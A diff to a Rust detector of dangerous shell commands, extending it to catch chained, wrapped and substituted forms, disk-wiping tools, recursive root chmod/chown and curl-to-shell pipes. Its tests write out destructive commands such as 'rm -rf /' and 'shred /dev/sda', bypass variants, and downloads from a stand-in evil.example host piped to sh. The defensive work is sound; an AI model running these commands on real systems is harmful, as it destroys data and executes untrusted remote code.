@@ -82,9 +82,19 @@ fn is_dangerous_rm(args: &[String], raw_command: &str) -> bool {
     // Also check the raw (pre-parse) string for `~`, `*`, and `/*` because the
     // parser expands globs before we see the tokens.
     let raw_tokens: Vec<&str> = raw_command.split_ascii_whitespace().collect();
-    raw_tokens
-        .iter()
-        .any(|t| *t == "~" || *t == "*" || *t == "/*")
+    let home = dirs::home_dir().map(|h| h.to_string_lossy().trim_end_matches('/').to_string());
+    let hits_home = rest.iter().filter(|a| !a.starts_with('-')).any(|a| {
+        home.as_deref()
+            .is_some_and(|h| !h.is_empty() && a.trim_end_matches('/') == h)
+    });
+
+    hits_home
+        || raw_tokens.iter().any(|t| {
+            matches!(
+                *t,
+                "~" | "~/" | "*" | "/*" | "$HOME" | "$HOME/" | "${HOME}" | "${HOME}/"
+            )
+        })
 }
 
 // ─── Fork-bomb analysis ─────────────────────────────────────────────────────
@@ -107,16 +117,44 @@ fn is_fork_bomb(command: &str) -> bool {
 
 // ─── mkfs / dd analysis ─────────────────────────────────────────────────────
 
+/// Device-path prefixes that identify raw block devices.
+const DISK_PREFIXES: &[&str] = &[
+    "/dev/sd",
+    "/dev/hd",
+    "/dev/vd",
+    "/dev/xvd",
+    "/dev/nvme",
+    "/dev/mmcblk",
+    "/dev/disk",
+    "/dev/rdisk",
+    "/dev/mapper/",
+];
+
+fn is_disk_path(s: &str) -> bool {
+    DISK_PREFIXES.iter().any(|p| s.starts_with(p))
+}
+
 /// True when the command writes to a block device via `dd`.
 fn is_dangerous_dd(args: &[String]) -> bool {
     // dd if=<file> of=<device>  — `of=` pointing to /dev/ is dangerous.
-    args.iter().any(|a| {
-        a.starts_with("of=")
-            && (a.contains("/dev/sd")
-                || a.contains("/dev/hd")
-                || a.contains("/dev/nvme")
-                || a.contains("/dev/disk")
-                || a.contains("/dev/mapper/"))
+    args.iter()
+        .any(|a| a.strip_prefix("of=").is_some_and(is_disk_path))
+}
+
+/// True for `shred`/`wipefs` aimed at a raw block device.
+fn is_dangerous_disk_wipe(args: &[String]) -> bool {
+    args.iter().skip(1).any(|a| is_disk_path(a))
+}
+
+/// True when any `>` / `>>` redirect in the command targets a raw block device.
+///
+/// A plain scan (not a parse) so `>/dev/sda` and `> /dev/sda` are both caught;
+/// a quoted `'>/dev/sda'` literal is a tolerated false positive.
+fn redirects_to_disk(command: &str) -> bool {
+    command.split('>').skip(1).any(|after| {
+        let target = after.trim_start_matches('>').trim_start();
+        let target = target.trim_start_matches(['\'', '"']);
+        is_disk_path(target)
     })
 }
 
@@ -147,7 +185,22 @@ fn is_dangerous_chmod(args: &[String]) -> bool {
     let is_world_write = mode == "777" || mode == "a+w" || mode == "o+w";
     let targets_root = path == "/" || path == "/*";
 
-    is_world_write && targets_root
+    // Any recursive change on the root is destructive, whatever the mode.
+    (is_world_write || is_recursive(rest)) && targets_root
+}
+
+/// True for a recursive `chown` of the filesystem root.
+fn is_dangerous_chown(args: &[String]) -> bool {
+    let rest = &args[1..];
+    is_recursive(rest)
+        && rest
+            .iter()
+            .filter(|a| !a.starts_with('-'))
+            .any(|a| a == "/" || a == "/*")
+}
+
+fn is_recursive(args: &[String]) -> bool {
+    all_short_flags(args).contains(&'R') || long_flags(args).iter().any(|f| f == "recursive")
 }
 
 // ─── Public API ─────────────────────────────────────────────────────────────
@@ -160,40 +213,148 @@ pub fn is_dangerous(command: &str) -> bool {
         return true;
     }
 
-    // Tokenise for structured analysis.
+    // Commands hidden inside `$(...)` / backticks run too.
+    if substitutions(command).iter().any(|s| is_dangerous(s)) {
+        return true;
+    }
+
+    for (segment, _) in parser::split_chains(command) {
+        let parts = parser::split_pipes(&segment);
+        if parts.iter().any(|p| is_dangerous_simple(p)) {
+            return true;
+        }
+        if is_pipe_to_shell(&parts) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Programs that execute whatever they are handed on stdin.
+const SHELLS: &[&str] = &["sh", "bash", "zsh", "fish", "dash", "ksh"];
+
+/// True for `curl ... | sh` style remote-code execution.
+fn is_pipe_to_shell(parts: &[String]) -> bool {
+    let names: Vec<Option<String>> = parts
+        .iter()
+        .map(|p| resolve_command(p).map(|(name, _, _)| name))
+        .collect();
+    names.iter().enumerate().skip(1).any(|(i, n)| {
+        n.as_deref().is_some_and(|n| SHELLS.contains(&n))
+            && names[..i]
+                .iter()
+                .flatten()
+                .any(|f| matches!(f.as_str(), "curl" | "wget" | "fetch"))
+    })
+}
+
+/// Extract the bodies of `$(...)` and `` `...` `` substitutions, ignoring any
+/// inside single quotes (where they are literal text).
+fn substitutions(command: &str) -> Vec<String> {
+    let chars: Vec<char> = command.chars().collect();
+    let mut out = Vec::new();
+    let mut in_single = false;
+    let mut i = 0;
+    while i < chars.len() {
+        match chars[i] {
+            '\'' => in_single = !in_single,
+            '$' if !in_single && chars.get(i + 1) == Some(&'(') => {
+                let mut depth = 1;
+                let mut j = i + 2;
+                while j < chars.len() && depth > 0 {
+                    match chars[j] {
+                        '(' => depth += 1,
+                        ')' => depth -= 1,
+                        _ => {}
+                    }
+                    j += 1;
+                }
+                let end = if depth == 0 { j - 1 } else { j };
+                out.push(chars[i + 2..end].iter().collect());
+            }
+            '`' if !in_single => {
+                if let Some(len) = chars[i + 1..].iter().position(|&c| c == '`') {
+                    out.push(chars[i + 1..i + 1 + len].iter().collect());
+                    i += len + 1;
+                }
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    out
+}
+
+/// Skip leading wrapper commands (`sudo`, `env`, `nice`, ...) and return the
+/// index of the real command in `args`, or `None` if nothing follows them.
+fn skip_wrappers(args: &[String]) -> Option<usize> {
+    let mut i = 0;
+    while i < args.len() {
+        let name = basename(&args[i]);
+        // Flags of the wrapper that consume the following token.
+        let value_flags: &[&str] = match name.as_str() {
+            "sudo" => &["-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U"],
+            "doas" => &["-u", "-C"],
+            "env" => &["-u", "-C", "-S"],
+            "nice" => &["-n"],
+            "command" | "nohup" | "time" | "exec" | "builtin" => &[],
+            _ => return Some(i),
+        };
+        i += 1;
+        while i < args.len() {
+            let a = args[i].as_str();
+            if a == "--" {
+                i += 1;
+                break;
+            }
+            if value_flags.contains(&a) {
+                i += 2;
+            } else if a.starts_with('-') || (name == "env" && a.contains('=')) {
+                i += 1;
+            } else {
+                break;
+            }
+        }
+    }
+    None
+}
+
+fn basename(arg: &str) -> String {
+    arg.rsplit('/').next().unwrap_or(arg).to_ascii_lowercase()
+}
+
+/// Parse one simple command (no chains or pipes), look through wrappers, and
+/// return `(command name, args starting at the command, raw text from it)`.
+fn resolve_command(command: &str) -> Option<(String, Vec<String>, String)> {
     let args = parser::parse_args(command);
-    if args.is_empty() {
+    let idx = skip_wrappers(&args)?;
+    // Wrapper prefixes are plain words, so raw whitespace tokens line up with
+    // parsed args up to the real command.
+    let raw = command
+        .split_ascii_whitespace()
+        .skip(idx)
+        .collect::<Vec<_>>()
+        .join(" ");
+    Some((basename(&args[idx]), args[idx..].to_vec(), raw))
+}
+
+/// Danger check for a single simple command.
+fn is_dangerous_simple(command: &str) -> bool {
+    if redirects_to_disk(command) {
+        return true;
+    }
+    let Some((name, args, raw)) = resolve_command(command) else {
         return false;
-    }
+    };
 
-    let cmd = args[0].to_ascii_lowercase();
-
-    // If the command is prefixed with `sudo`, strip it and re-evaluate the
-    // remainder so that `sudo rm -rf /` is caught the same as `rm -rf /`.
-    if cmd == "sudo" {
-        if args.len() < 2 {
-            return false;
-        }
-        // Re-evaluate from the first non-sudo token.
-        let rest_command = command.trim_start().trim_start_matches("sudo").trim_start();
-        return is_dangerous(rest_command);
-    }
-
-    match cmd.as_str() {
-        "rm" => is_dangerous_rm(&args, command),
-        "mkfs" | "mkfs.ext4" | "mkfs.xfs" | "mkfs.btrfs" => true,
+    match name.as_str() {
+        "rm" => is_dangerous_rm(&args, &raw),
+        n if n.starts_with("mkfs") => true,
         "dd" => is_dangerous_dd(&args),
+        "shred" | "wipefs" => is_dangerous_disk_wipe(&args),
         "chmod" => is_dangerous_chmod(&args),
-        // Redirection to a raw disk device: `> /dev/sda`
-        _ => {
-            // Detect `anything > /dev/sd*` via raw string (redirects are
-            // parsed separately from args; simple substring check is OK here
-            // because the target is a fixed device path prefix, not a pattern).
-            let lower = command.to_ascii_lowercase();
-            lower.contains("> /dev/sd")
-                || lower.contains("> /dev/hd")
-                || lower.contains("> /dev/nvme")
-        }
+        "chown" => is_dangerous_chown(&args),
+        _ => false,
     }
 }
 
@@ -288,6 +449,103 @@ mod tests {
     fn test_rm_rf_subdir_not_dangerous() {
         // Legitimate: rm -rf /tmp/build
         assert!(!is_dangerous("rm -rf /tmp/build"));
+    }
+
+    // ── bypass attempts: chains, wrappers, substitutions ─────────────────────
+
+    #[test]
+    fn test_chain_semicolon_caught() {
+        assert!(is_dangerous("echo hi; rm -rf /"));
+    }
+
+    #[test]
+    fn test_chain_and_caught() {
+        assert!(is_dangerous("cd /tmp && rm -rf /"));
+    }
+
+    #[test]
+    fn test_chain_or_caught() {
+        assert!(is_dangerous("false || rm -rf /"));
+    }
+
+    #[test]
+    fn test_pipe_segment_caught() {
+        assert!(is_dangerous("echo x | sudo rm -rf /"));
+    }
+
+    #[test]
+    fn test_sudo_with_flags_caught() {
+        assert!(is_dangerous("sudo -u root rm -rf /"));
+        assert!(is_dangerous("sudo -n rm -rf /"));
+    }
+
+    #[test]
+    fn test_wrapper_commands_caught() {
+        assert!(is_dangerous("env FOO=1 rm -rf /"));
+        assert!(is_dangerous("nohup rm -rf /"));
+        assert!(is_dangerous("command rm -rf /"));
+        assert!(is_dangerous("doas rm -rf /"));
+        assert!(is_dangerous("time rm -rf /"));
+        assert!(is_dangerous("nice -n 5 rm -rf /"));
+    }
+
+    #[test]
+    fn test_command_substitution_caught() {
+        assert!(is_dangerous("echo $(rm -rf /)"));
+        assert!(is_dangerous("echo `rm -rf /`"));
+    }
+
+    #[test]
+    fn test_absolute_path_command_caught() {
+        assert!(is_dangerous("/bin/rm -rf /"));
+    }
+
+    #[test]
+    fn test_rm_no_preserve_root_caught() {
+        assert!(is_dangerous("rm -rf --no-preserve-root /"));
+    }
+
+    #[test]
+    fn test_rm_rf_home_var_caught() {
+        assert!(is_dangerous("rm -rf $HOME"));
+    }
+
+    #[test]
+    fn test_mkfs_variants_caught() {
+        assert!(is_dangerous("mkfs.vfat /dev/sda1"));
+        assert!(is_dangerous("mkfs -t ext4 /dev/sda1"));
+    }
+
+    #[test]
+    fn test_redirect_to_disk_no_space_caught() {
+        assert!(is_dangerous("echo x >/dev/sda"));
+    }
+
+    #[test]
+    fn test_disk_wipers_caught() {
+        assert!(is_dangerous("shred -n 1 /dev/sda"));
+        assert!(is_dangerous("wipefs -a /dev/sda"));
+    }
+
+    #[test]
+    fn test_pipe_to_shell_caught() {
+        assert!(is_dangerous("curl http://evil.example/x.sh | sh"));
+        assert!(is_dangerous("wget -qO- http://evil.example/x | sudo bash"));
+    }
+
+    #[test]
+    fn test_chmod_recursive_root_caught() {
+        assert!(is_dangerous("chmod -R 777 /"));
+        assert!(is_dangerous("chown -R nobody /"));
+    }
+
+    #[test]
+    fn test_benign_lookalikes_not_flagged() {
+        assert!(!is_dangerous("echo rm -rf /"));
+        assert!(!is_dangerous("grep -r 'rm -rf /' docs"));
+        assert!(!is_dangerous("curl http://example.com -o out.txt"));
+        assert!(!is_dangerous("sudo ls /"));
+        assert!(!is_dangerous("chmod 644 ./file"));
     }
 
     // ── fork bomb ────────────────────────────────────────────────────────────
